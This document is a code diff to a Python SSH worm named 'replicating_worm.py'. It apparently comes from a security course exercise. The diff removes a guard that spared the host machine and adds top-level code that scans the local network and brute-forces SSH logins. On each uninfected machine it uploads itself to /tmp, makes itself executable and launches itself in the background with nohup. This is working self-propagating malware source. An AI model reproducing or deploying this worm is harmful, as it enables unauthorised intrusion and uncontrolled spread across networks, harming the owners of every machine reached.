@@ -57,6 +57,7 @@ def isTargetInfected(ssh):
 	 
 		# The system is already infected
 		infected = True
+		print("Target is already infected!!")
 	except:
 		print("Target should be infected!!")
 
@@ -113,46 +114,34 @@ def attackHost(host):
 		except:
 			numTries = numTries + 1
 
-	print("Number of attempts before correct connect: %d" %(numTries))
-
 	return None
 
 
-def startAttacking(wormLocation, isHost):
 
-	network = getHostsOnTheSameNetwork()
+markSystem();
+network = getHostsOnTheSameNetwork()
 
-	if isHost:
-		print network
+print network
 
-	for Host in network:
+for Host in network:		
+
+	print ("Trying host: " + Host)
+	sshInfo = attackHost(Host)
+	print("Success! Got in!!!")
 		
-		sshInfo = attackHost(Host)
-		
-		if sshInfo and isTargetInfected(sshInfo[0]) == False:
+	if sshInfo and isTargetInfected(sshInfo[0]) == False:
+		print("Spreading to this machine: %s" %(str(Host)))
+		try:
+			sftpClient = sshInfo[0].open_sftp()
+			sftpClient.put("replicating_worm.py", "/tmp/" + "replicating_worm.py")
+			sshInfo[0].exec_command("chmod a+x /tmp/replicating_worm.py")
+			sshInfo[0].exec_command("nohup python /tmp/replicating_worm.py &")
+		except:
+			print ("Something went wrong")
 
-			if isHost:
-				print("Spreading to this machine: %s" %(str(Host)))
-			try:
-				sftpClient = sshInfo[0].open_sftp()
-				sftpClient.put(wormLocation, "/tmp/" + "replicating_worm.py")
-				sshInfo[0].exec_command("chmod a+x /tmp/replicating_worm.py")
-				sshInfo[0].exec_command("nohup python /tmp/replicating_worm.py &")
-			except:
-				print ("Something went wrong")
+print("Finshed being wormy!!")
 
-		elif isHost:
-			print("Could not spread to this host: %s" %(str(Host)))
 	
-	
-if sys.argv[1] == "-h":
-	print("Usage: python replicating_worm.py [-host | -h | -t]\n-host this si the host system don't attack!\n-h Shows help screen\nDefault will attack host and spread\n")
-elif sys.argv[1] == "-host":
-	markSystem()
-	startAttacking("replicating_worm.py", True)
-else:
-	markSystem()
-	startAttacking("replicating_worm.py", False)
 
 
 
